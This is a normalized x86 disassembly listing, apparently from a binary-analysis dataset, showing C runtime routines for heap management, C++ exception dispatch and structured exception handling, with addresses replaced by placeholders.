mov eax [ ebp - 0x4 ]
sub_40d3b3
push esi
call sub_405f31
push [ rw-data ]
call sub_40d472
mov edx [ rw-data ]
pop ecx
mov ecx [ rw-data ]
mov esi ecx
sub esi edx
add esi 0x4
cmp eax esi
jae r-xdata
mov eax [ esp + 0x8 ]
mov [ ecx ] eax
add [ rw-data ] 0x4
mov esi eax
push edx
call sub_40d472
add eax 0x10
push eax
push [ rw-data ]
call sub_4090b4
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ rw-data ]
sub ecx [ rw-data ]
mov [ rw-data ] eax
sar ecx 0x2
lea ecx [ eax + ecx * 4 ]
mov [ rw-data ] ecx
xor esi esi
jmp r-xdata
call sub_405f3a
mov eax esi
pop esi
retn
sub_40d443
push 0x80
call sub_406abc
test eax eax
pop ecx
mov [ rw-data ] eax
jne r-xdata
and [ eax ] 0x0
mov eax [ rw-data ]
mov [ rw-data ] eax
retn
push 0x18
call sub_403c1a
mov eax [ rw-data ]
pop ecx
sub_40d472
push esi
push 0x9
call sub_403c8c
mov esi [ esp + 0xc ]
push esi
call sub_407391
pop ecx
test eax eax
pop ecx
je r-xdata
push 0x9
call sub_403ced
pop ecx
push esi
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
mov esi eax
mov esi [ esi - 0x4 ]
push 0x9
sub esi 0x9
call sub_403ced
pop ecx
jmp r-xdata
mov eax esi
pop esi
retn
sub_40d4b7
push ebx
push esi
mov esi [ esp + 0x10 ]
cmp esi 0xffffffe0
jbe r-xdata
push 0x9
call sub_403c8c
mov ebx [ esp + 0x10 ]
push ebx
call sub_407391
pop ecx
test eax eax
pop ecx
je r-xdata
xor eax eax
jmp r-xdata
push 0x9
call sub_403ced
test esi esi
pop ecx
jne r-xdata
push edi
xor edi edi
cmp esi [ rw-data ]
ja r-xdata
pop esi
pop ebx
retn
add esi 0xf
and esi 0xfffffff0
push esi
push ebx
push 0x10
push [ rw-data ]
call [ HeapReAlloc@IAT ]
push 0x1
pop esi
push 0x9
call sub_403ced
pop ecx
mov eax edi
pop edi
jmp r-xdata
push esi
push ebx
push eax
call sub_407b9c
add esp 0xc
test eax eax
je r-xdata
mov edi ebx
sub_40d52e
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
cmp [ eax ] 0xe06d7363
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ eax + 0x10 ] 0x3
jne r-xdata
xor eax eax
push eax
call sub_40df4f
test eax eax
pop ecx
je r-xdata
cmp [ eax + 0x14 ] 0x19930520
jne r-xdata
push esi
call [ rw-data ]
jmp r-xdata
jmp sub_40ddfc
pop esi
retn 0x4
sub_40d592
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x18 ]
push edi
mov edi 0x19930520
cmp [ esi ] edi
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
je r-xdata
call sub_40de5d
cmp [ esi + 0xc ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
push 0x1
pop eax
cmp [ eax ] 0xe06d7363
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_40d62d
add esp 0x20
cmp [ eax + 0x14 ] edi
jbe r-xdata
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_40d8e7
add esp 0x10
jmp r-xdata
mov ecx [ eax + 0x1c ]
mov ecx [ ecx + 0x8 ]
test ecx ecx
je r-xdata
movzx edx [ ebp + 0x24 ]
push edx
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call ecx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebp
retn
sub_40d62d
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0xc ]
and [ ebp - 0x14 ] 0x0
mov eax [ eax + 0x8 ]
cmp eax 0xffffffff
mov [ ebp - 0x10 ] eax
jl r-xdata
call sub_40de5d
mov ecx [ ebp + 0x18 ]
cmp eax [ ecx + 0x4 ]
jl r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx 0xe06d7363
push edi
mov edi 0x19930520
cmp [ esi ] ebx
jne r-xdata
jmp sub_40ddfc
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x10 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_40d7e0
add esp 0x20
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
call sub_404c63
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov edi [ ebp - 0x10 ]
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
call sub_40d317
add esp 0x14
mov ebx eax
call sub_404c63
mov esi [ eax + 0x6c ]
call sub_404c63
mov eax [ eax + 0x70 ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x14 ] 0x1
call sub_40df17
pop ecx
test eax eax
pop ecx
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
cmp [ ebx ] edi
jg r-xdata
cmp [ esi ] ebx
jne r-xdata
call sub_40de5d
push 0x1
push esi
call sub_40dd1f
pop ecx
pop ecx
inc [ ebp - 0x4 ]
add ebx 0x14
jmp r-xdata
cmp edi [ ebx + 0x4 ]
jg r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x18 ]
jae r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp + 0x8 ] eax
mov eax [ ebx + 0xc ]
test eax eax
mov [ ebp - 0xc ] eax
jle r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
mov edi [ ebp - 0x10 ]
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea edi [ eax + 0x4 ]
mov eax [ eax ]
test eax eax
mov [ ebp - 0x8 ] eax
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
dec [ ebp - 0xc ]
add [ ebp + 0x8 ] 0x10
cmp [ ebp - 0xc ] 0x0
jg r-xdata
push [ esi + 0x1c ]
push [ edi ]
push [ ebp + 0x8 ]
call sub_40d88a
add esp 0xc
test eax eax
jne r-xdata
call sub_40de5d
jmp r-xdata
push [ ebp - 0x14 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push ebx
push [ edi ]
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_40d99b
add esp 0x2c
dec [ ebp - 0x8 ]
add edi 0x4
cmp [ ebp - 0x8 ] eax
jg r-xdata
sub_40d7e0
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
call sub_404c63
cmp [ eax + 0x68 ] 0x0
je r-xdata
mov edi [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
call sub_40d317
add esp 0x14
mov esi eax
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40d1ec
add esp 0x1c
test eax eax
jne r-xdata
pop edi
pop esi
leave
retn
cmp edi [ esi ]
jl r-xdata
inc [ ebp - 0x4 ]
add esi 0x14
jmp r-xdata
cmp edi [ esi + 0x4 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
jae r-xdata
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x10 ]
shl eax 0x4
add eax ecx
mov ecx [ eax - 0xc ]
test ecx ecx
je r-xdata
push 0x1
add eax 0xfffffff0
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push esi
push 0x0
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40d99b
add esp 0x2c
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
sub_40d88a
push esi
push edi
mov edi [ esp + 0xc ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push 0x1
pop eax
cmp [ eax + 0x8 ] 0x0
lea edx [ eax + 0x8 ]
je r-xdata
mov esi [ esp + 0x10 ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_408850
pop ecx
test eax eax
pop ecx
jne r-xdata
mov eax [ esp + 0x14 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
retn
test [ edi ] 0x2
jne r-xdata
sub_40d8e7
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov ebx [ ebp + 0x8 ]
mov esi [ ebx + 0x8 ]
mov [ ebp - 0x1c ] esi
mov edi [ ebp + 0x10 ]
mov [ ebx + 0x8 ] esi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp esi 0xffffffff
jle r-xdata
call sub_40de5d
cmp esi [ edi + 0x4 ]
jl r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push 0x103
push ebx
push eax
call sub_40ddb0
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x8 ]
mov eax [ eax + esi * 8 + 0x4 ]
test eax eax
je r-xdata
mov eax [ edi + 0x8 ]
mov esi [ eax + esi * 8 ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_40d99b
push ebp
mov ebp esp
cmp [ ebp + 0x20 ] 0x0
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
mov edi [ ebp + 0xc ]
je r-xdata
cmp [ ebp + 0x2c ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x20 ]
push ebx
push edi
push [ ebp + 0x8 ]
call sub_40db5b
add esp 0x10
push [ ebp + 0x2c ]
push edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push edi
push eax
call sub_40d0ac
call sub_40d0ee
mov esi [ ebp + 0x24 ]
push [ esi ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push edi
call sub_40d8e7
mov eax [ esi + 0x4 ]
push 0x100
push [ ebp + 0x28 ]
inc eax
mov [ edi + 0x8 ] eax
push [ ebx + 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_40da16
add esp 0x2c
test eax eax
je r-xdata
sub_40da16
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x2c ] ebx
and [ ebp - 0x24 ] 0x0
mov esi [ ebp + 0xc ]
mov eax [ esi - 0x4 ]
mov [ ebp - 0x28 ] eax
call sub_404c63
mov eax [ eax + 0x6c ]
mov [ ebp - 0x1c ] eax
call sub_404c63
mov eax [ eax + 0x70 ]
mov [ ebp - 0x20 ] eax
call sub_404c63
mov edi [ ebp + 0x8 ]
mov [ eax + 0x6c ] edi
call sub_404c63
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x70 ] ecx
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x1
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ebx
push [ ebp + 0x14 ]
push esi
call sub_40d173
add esp 0x14
mov [ ebp - 0x2c ] eax
and [ ebp - 0x4 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
call sub_40dae3
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_40dae3
mov eax [ ebp - 0x28 ]
mov [ esi - 0x4 ] eax
call sub_404c63
mov ecx [ ebp - 0x1c ]
mov [ eax + 0x6c ] ecx
call sub_404c63
mov ecx [ ebp - 0x20 ]
mov [ eax + 0x70 ] ecx
cmp [ edi ] 0xe06d7363
jne r-xdata
retn
cmp [ edi + 0x10 ] 0x3
jne r-xdata
cmp [ edi + 0x14 ] 0x19930520
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
je r-xdata
call sub_40680a
push eax
push edi
call sub_40dd1f
pop ecx
pop ecx
sub_40db31
mov eax [ esp + 0x4 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
cmp [ eax + 0x14 ] 0x19930520
jne r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
push 0x1
pop eax
retn
sub_40db5b
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov ecx [ ebp + 0x10 ]
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ecx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0xc ]
lea edi [ eax + edx + 0xc ]
and [ ebp - 0x4 ] 0x0
test [ ecx ] 0x8
je r-xdata
mov esi [ ebp + 0x14 ]
test [ esi ] 0x1
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x1
push [ esi + 0x18 ]
call sub_40df17
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ esi + 0x18 ] 0x0
mov ebx [ ebp + 0x8 ]
push 0x1
push [ ebx + 0x18 ]
jne r-xdata
mov ebx [ ebp + 0x8 ]
push 0x1
push [ ebx + 0x18 ]
call sub_40df17
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_40de5d
push 0x1
push edi
call sub_40df33
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_40df17
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_40df17
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_40df33
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ esi + 0x18 ]
mov [ edi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push 0x1
push edi
call sub_40df33
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_40df33
pop ecx
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
push [ ebx + 0x18 ]
push edi
call sub_4089e0
add esp 0xc
cmp [ esi + 0x14 ] 0x4
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
push [ esi + 0x18 ]
call sub_40df4f
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
add esi 0x8
push esi
push [ ebx + 0x18 ]
call sub_40dd86
pop ecx
pop ecx
push eax
push edi
call sub_4089e0
add esp 0xc
jmp r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
test [ esi ] 0x4
je r-xdata
add esi 0x8
push esi
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_40dd86
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_40d0e0
jmp r-xdata
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_40dd86
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_40d0e7
jmp r-xdata
push eax
call sub_40dd86
pop ecx
pop ecx
mov [ edi ] eax
jmp r-xdata
sub_40dd1f
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ eax + 0x1c ]
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
and [ ebp - 0x4 ] 0x0
push ecx
push [ eax + 0x18 ]
call sub_40d0e0
or [ ebp - 0x4 ] 0xffffffff
sub_40dd86
mov ecx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
mov eax [ ecx ]
mov edx [ ecx + 0x4 ]
add eax esi
test edx edx
jl r-xdata
pop esi
retn
mov esi [ edx + esi ]
mov ecx [ ecx + 0x8 ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_40ddb0
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_40682d
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_40682d
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_40ddfc
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor esi esi
mov [ ebp - 0x4 ] esi
call sub_404c63
cmp [ eax + 0x60 ] esi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call $+5
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
call sub_404c63
call [ eax + 0x60 ]
mov [ ebp - 0x4 ] esi
jmp r-xdata
push 0xa
call sub_406969
push 0x16
call sub_40df7e
pop ecx
pop ecx
push 0x3
call sub_405e7b
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
dec eax
push ebx
push esi
dec eax
push edi
je r-xdata
mov ebx [ rw-data ]
mov edi rw-data
dec eax
dec eax
je r-xdata
xor ecx ecx
cmp ebx ecx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_404c63
mov esi eax
push [ esi + 0x50 ]
push [ ebp + 0x8 ]
call sub_40e100
mov edi eax
pop ecx
add edi 0x8
pop ecx
mov ebx [ edi ]
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x8
je r-xdata
cmp [ ebp - 0x4 ] ecx
je r-xdata
xor eax eax
push ebx
call sub_403ced
pop ecx
jmp r-xdata
cmp ebx 0x1
jne r-xdata
sub eax 0x3
je r-xdata
mov edx [ esi + 0x54 ]
cmp eax 0x8
mov [ ebp - 0x8 ] edx
mov [ esi + 0x54 ] ecx
jne r-xdata
cmp eax 0xb
je r-xdata
push 0x3
call sub_405e7b
push 0x1
call sub_403ced
pop ecx
sub eax 0x4
je r-xdata
mov [ edi ] ecx
mov edx [ esi + 0x58 ]
mov [ esi + 0x58 ] 0x8c
mov [ ebp - 0xc ] edx
cmp eax 0x4
jne r-xdata
mov ebx [ rw-data ]
mov edi rw-data
jmp r-xdata
sub eax 0x6
je r-xdata
cmp [ ebp + 0x8 ] 0x8
jne r-xdata
push 0x1
call sub_403ced
pop ecx
mov ecx [ rw-data ]
mov eax [ rw-data ]
add eax ecx
cmp ecx eax
jge r-xdata
cmp eax 0x8
jne r-xdata
push 0x1
mov [ ebp - 0x4 ] 0x1
call sub_403c8c
mov esi [ ebp + 0x8 ]
pop ecx
mov ebx [ rw-data ]
mov edi rw-data
jmp r-xdata
dec eax
je r-xdata
push [ ebp + 0x8 ]
call ebx
cmp [ ebp + 0x8 ] 0xb
pop ecx
je r-xdata
push [ esi + 0x58 ]
push 0x8
call ebx
pop ecx
pop ecx
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea eax [ ecx + ecx * 2 ]
shl eax 0x2
mov ebx [ rw-data ]
mov edi rw-data
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ ebp + 0x8 ] 0x8
mov [ esi + 0x54 ] eax
jne r-xdata
cmp [ ebp + 0x8 ] 0x4
jne r-xdata
mov edx [ esi + 0x50 ]
add eax 0xc
and [ edx + eax - 0x4 ] 0x0
mov edx [ rw-data ]
mov edi [ rw-data ]
inc ecx
add edi edx
cmp ecx edi
jl r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp - 0xc ]
mov [ esi + 0x58 ] eax
sub_40de5d
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
mov eax [ rw-data ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call $+5
jmp sub_40ddfc
mov [ ebp - 0x4 ] 0x1
call eax
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub_40dec0
push ebp
mov ebp esp
push edi
push esi
mov edi [ ebp + 0x8 ]
mov edx edi
mov esi edi
xor eax eax
or ecx 0xffffffff
[ edi ]
cmp ecx 0xfffffffe
je r-xdata
mov eax edx
pop esi
pop edi
leave
retn
dec edi
dec edi
mov ah [ esi ]
mov al [ edi ]
mov [ esi ] al
mov [ edi ] ah
inc esi
dec edi
jmp r-xdata
cmp esi edi
jae r-xdata
sub_40def0
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
inc ecx
neg ecx
dec edi
mov al [ ebp + 0xc ]
std
[ edi ]
inc edi
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_40df7e
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
dec eax
push ebx
push esi
dec eax
push edi
je r-xdata
mov ebx [ rw-data ]
mov edi rw-data
dec eax
dec eax
je r-xdata
xor ecx ecx
cmp ebx ecx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_404c63
mov esi eax
push [ esi + 0x50 ]
push [ ebp + 0x8 ]
call sub_40e100
mov edi eax
pop ecx
add edi 0x8
pop ecx
mov ebx [ edi ]
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x8
je r-xdata
cmp [ ebp - 0x4 ] ecx
je r-xdata
xor eax eax
push ebx
call sub_403ced
pop ecx
jmp r-xdata
cmp ebx 0x1
jne r-xdata
sub eax 0x3
je r-xdata
mov edx [ esi + 0x54 ]
cmp eax 0x8
mov [ ebp - 0x8 ] edx
mov [ esi + 0x54 ] ecx
jne r-xdata
cmp eax 0xb
je r-xdata
push 0x3
call sub_405e7b
push 0x1
call sub_403ced
pop ecx
sub eax 0x4
je r-xdata
mov [ edi ] ecx
mov edx [ esi + 0x58 ]
mov [ esi + 0x58 ] 0x8c
mov [ ebp - 0xc ] edx
cmp eax 0x4
jne r-xdata
mov ebx [ rw-data ]
mov edi rw-data
jmp r-xdata
sub eax 0x6
je r-xdata
cmp [ ebp + 0x8 ] 0x8
jne r-xdata
push 0x1
call sub_403ced
pop ecx
mov ecx [ rw-data ]
mov eax [ rw-data ]
add eax ecx
cmp ecx eax
jge r-xdata
cmp eax 0x8
jne r-xdata
push 0x1
mov [ ebp - 0x4 ] 0x1
call sub_403c8c
mov esi [ ebp + 0x8 ]
pop ecx
mov ebx [ rw-data ]
mov edi rw-data
jmp r-xdata
dec eax
je r-xdata
push [ ebp + 0x8 ]
call ebx
cmp [ ebp + 0x8 ] 0xb
pop ecx
je r-xdata
push [ esi + 0x58 ]
push 0x8
call ebx
pop ecx
pop ecx
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea eax [ ecx + ecx * 2 ]
shl eax 0x2
mov ebx [ rw-data ]
mov edi rw-data
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ ebp + 0x8 ] 0x8
mov [ esi + 0x54 ] eax
jne r-xdata
cmp [ ebp + 0x8 ] 0x4
jne r-xdata
mov edx [ esi + 0x50 ]
add eax 0xc
and [ edx + eax - 0x4 ] 0x0
mov edx [ rw-data ]
mov edi [ rw-data ]
inc ecx
add edi edx
cmp ecx edi
jl r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp - 0xc ]
mov [ esi + 0x58 ] eax
sub_40e100
mov edx [ esp + 0x8 ]
mov ecx [ rw-data ]
push esi
mov esi [ esp + 0x8 ]
cmp [ edx + 0x4 ] esi
push edi
mov eax edx
je r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
cmp eax ecx
jae r-xdata
lea edi [ ecx + ecx * 2 ]
lea edi [ edx + edi * 4 ]
xor eax eax
cmp [ eax + 0x4 ] esi
je r-xdata
cmp [ eax + 0x4 ] esi
jne r-xdata
pop edi
pop esi
retn
add eax 0xc
cmp eax edi
jae r-xdata
sub_40e140
sub esp 0x18
push esi
call sub_40e240
test eax eax
jge r-xdata
mov eax [ esp + 0x28 ]
mov edx [ esp + 0x20 ]
mov ecx [ esp + 0x2c ]
mov esi [ esp + 0x24 ]
mov [ esp + 0x10 ] eax
xor eax eax
mov [ esp + 0x4 ] edx
mov [ esp + 0x18 ] eax
mov [ esp + 0xc ] eax
lea edx [ esp + 0x4 ]
mov [ esp + 0x14 ] ecx
mov ecx [ esi ]
lea eax [ esp + 0x10 ]
push edx
push eax
mov [ esp + 0x10 ] ecx
call sub_40e2f0
add esp 0x8
test eax eax
jge r-xdata
or eax 0xffffffff
pop esi
add esp 0x18
retn
call sub_40e2a0
mov ecx [ esp + 0xc ]
xor eax eax
mov [ esi ] ecx
pop esi
add esp 0x18
retn
call sub_40e2a0
or eax 0xffffffff
pop esi
add esp 0x18
retn
sub_40e1c0
sub esp 0x18
push esi
call sub_40e240
test eax eax
jge r-xdata
mov eax [ esp + 0x28 ]
mov edx [ esp + 0x20 ]
mov ecx [ esp + 0x2c ]
mov esi [ esp + 0x24 ]
mov [ esp + 0x10 ] eax
xor eax eax
mov [ esp + 0x4 ] edx
mov [ esp + 0x18 ] eax
mov [ esp + 0xc ] eax
lea edx [ esp + 0x4 ]
mov [ esp + 0x14 ] ecx
mov ecx [ esi ]
lea eax [ esp + 0x10 ]
push edx
push eax
mov [ esp + 0x10 ] ecx
call sub_40e450
add esp 0x8
test eax eax
jge r-xdata
or eax 0xffffffff
pop esi
add esp 0x18
retn
call sub_40e2a0
mov ecx [ esp + 0xc ]
xor eax eax
mov [ esi ] ecx
pop esi
add esp 0x18
retn
call sub_40e2a0
or eax 0xffffffff
pop esi
add esp 0x18
retn
sub_40e240
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x4e74
call sub_406abc
push 0x4e74
mov [ rw-data ] eax
call sub_406abc
push 0x139d
mov [ rw-data ] eax
call sub_406abc
mov ecx [ rw-data ]
add esp 0xc
test ecx ecx
mov [ rw-data ] eax
je r-xdata
xor eax eax
retn
or eax 0xffffffff
retn
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
test eax eax
je r-xdata
xor eax eax
retn
sub_40e2a0
mov eax [ rw-data ]
push eax
call sub_404e2a
mov ecx [ rw-data ]
push ecx
call sub_404e2a
mov edx [ rw-data ]
push edx
call sub_404e2a
xor eax eax
add esp 0xc
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
retn
sub_40e2f0
mov eax [ rw-data ]
test eax eax
jne r-xdata
push ebx
push ebp
push esi
push edi
mov edi 0x100
xor eax eax
call sub_40e240
mov ecx [ rw-data ]
add eax 0x4
cmp eax 0x4e74
mov [ eax + ecx - 0x4 ] 0xffffffff
jl r-xdata
mov ebp [ esp + 0x14 ]
push ebp
call sub_40e5a0
push ebp
mov esi eax
call sub_40e5a0
mov ebx eax
add esp 0x8
cmp ebx 0xffffffff
je r-xdata
push esi
mov esi [ esp + 0x1c ]
push esi
call sub_40e670
push 0xfff
push esi
call sub_40e670
push 0x0
push esi
call sub_40e670
add esp 0x18
xor eax eax
